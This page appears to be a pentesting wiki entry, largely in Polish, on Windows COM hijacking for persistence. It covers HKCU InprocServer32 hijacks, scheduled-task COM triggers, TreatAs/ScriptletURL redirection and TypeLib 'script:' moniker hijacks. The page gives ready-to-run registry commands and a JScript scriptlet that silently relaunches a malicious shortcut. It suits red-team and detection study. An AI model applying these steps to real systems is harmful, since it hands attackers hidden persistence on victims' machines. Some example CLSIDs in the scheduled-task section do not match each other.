# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Wyszukiwanie nieistniejących komponentów COM

Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników, **COM Hijacking** może być użyty jako **persistence mechanism**. Używając `procmon` łatwo znaleźć wpisy rejestru COM, które są wyszukiwane, ale jeszcze nie istnieją i mogą zostać utworzone przez atakującego. Klasyczne filtry:

- **RegOpenKey** operations.
- where the _Result_ is **NAME NOT FOUND**.
- and the _Path_ ends with **InprocServer32**.

Przydatne warianty podczas poszukiwań:

- Zwróć również uwagę na brakujące klucze **`LocalServer32`**. Niektóre klasy COM są serwerami uruchamianymi poza procesem i uruchomią EXE kontrolowane przez atakującego zamiast DLL.
- Wyszukaj operacje rejestru **`TreatAs`** i **`ScriptletURL`** oprócz `InprocServer32`. Ostatnie treści dotyczące detekcji i raporty o malware często to wyróżniają, ponieważ są znacznie rzadsze niż normalne rejestracje COM i w związku z tym dają wysoki sygnał.
- Skopiuj prawidłowy **`ThreadingModel`** z oryginalnego `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` podczas klonowania rejestracji do HKCU. Użycie niewłaściwego modelu często psuje aktywację i powoduje, że hijack staje się noisy.
- Na systemach 64-bitowych sprawdź zarówno widoki 64-bitowe, jak i 32-bitowe (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` and `HKLM\Software\Classes\WOW6432Node`), ponieważ aplikacje 32-bitowe mogą rozwiązać inną rejestrację COM.

Gdy zdecydujesz, który nieistniejący komponent COM chcesz podszyć, wykonaj następujące polecenia. _Uważaj, jeśli zdecydujesz się podszyć komponent COM, który jest ładowany co kilka sekund — może to być przesada._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Komponenty COM Task Scheduler podatne na przejęcie

Windows Tasks używają Custom Triggers do wywoływania obiektów COM, a ponieważ są uruchamiane przez Task Scheduler, łatwiej przewidzieć, kiedy zostaną wyzwolone.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Analizując wynik możesz wybrać taki, który będzie wykonywany na przykład **za każdym razem, gdy użytkownik się zaloguje**.

Teraz, przeszukując CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID** oraz w HKLM i HKCU, zazwyczaj stwierdzisz, że wartość nie istnieje w HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Następnie możesz po prostu utworzyć wpis HKCU i za każdym razem, gdy użytkownik się zaloguje, twój backdoor zostanie uruchomiony.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` pozwala, aby jeden CLSID był emulowany przez inny. Z ofensywnego punktu widzenia oznacza to, że możesz pozostawić oryginalny CLSID bez zmian, utworzyć drugi per-user CLSID wskazujący na `scrobj.dll`, a następnie przekierować rzeczywisty obiekt COM na złośliwy za pomocą `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Jest to przydatne, gdy:

- aplikacja docelowa już instancjonuje stabilny CLSID przy logowaniu lub przy uruchomieniu aplikacji
- chcesz przekierowanie oparte wyłącznie na rejestrze zamiast zastępowania oryginalnego `InprocServer32`
- chcesz wykonać lokalny lub zdalny `.sct` scriptlet za pomocą wartości `ScriptletURL`

Przykładowy przebieg (dostosowany z publicznego materiału Atomic Red Team oraz wcześniejszych badań nad nadużyciami rejestru COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notatki:

- `scrobj.dll` odczytuje wartość `ScriptletURL` i uruchamia wskazany plik `.sct`, więc możesz przechowywać payload jako plik lokalny lub pobierać go zdalnie przez HTTP/HTTPS.
- `TreatAs` jest szczególnie przydatny, gdy oryginalna rejestracja COM jest kompletna i stabilna w HKLM, ponieważ potrzebujesz tylko małego przekierowania per-user zamiast mirrorować całe drzewo.
- Aby zweryfikować bez czekania na naturalny trigger, możesz ręcznie zainicjować fałszywy ProgID/CLSID poleceniem `rundll32.exe -sta <ProgID-or-CLSID>`, jeśli docelowa klasa obsługuje aktywację STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definiują interfejsy COM i są ładowane via `LoadTypeLib()`. Kiedy serwer COM jest instancjonowany, OS może również załadować powiązany TypeLib, sprawdzając klucze rejestru pod `HKCR\TypeLib\{LIBID}`. Jeśli ścieżka TypeLib zostanie zastąpiona **moniker**, np. `script:C:\...\evil.sct`, Windows wykona scriptlet w momencie rozwiązania TypeLib – co daje ukrytą persistencję uruchamianą, gdy powszechne komponenty są dotykane.

This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).

### Steps (PowerShell)

1) Zidentyfikuj TypeLib (LIBID) używany przez wysoko-frekfencyjny CLSID. Przykładowy CLSID często nadużywany przez malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Wskaż ścieżkę TypeLib dla użytkownika na lokalny scriptlet, używając monikera `script:` (nie są wymagane uprawnienia administratora):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Upuść minimalny JScript `.sct`, który ponownie uruchamia twój primary payload (np. `.lnk` używany przez initial chain):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Wyzwalanie – otwarcie IE, aplikacji, która osadza WebBrowser control, lub nawet rutynowa aktywność Explorer spowoduje załadowanie TypeLib i wykonanie scriptlet, re-arming your chain on logon/reboot.

Czyszczenie
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Uwagi
- Możesz zastosować tę samą logikę do innych często wykorzystywanych komponentów COM; zawsze najpierw rozwiąż rzeczywisty `LIBID` z `HKCR\CLSID\{CLSID}\TypeLib`.
- Na systemach 64-bitowych możesz również wypełnić podklucz `win64` dla 64-bitowych konsumentów.

## Referencje

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
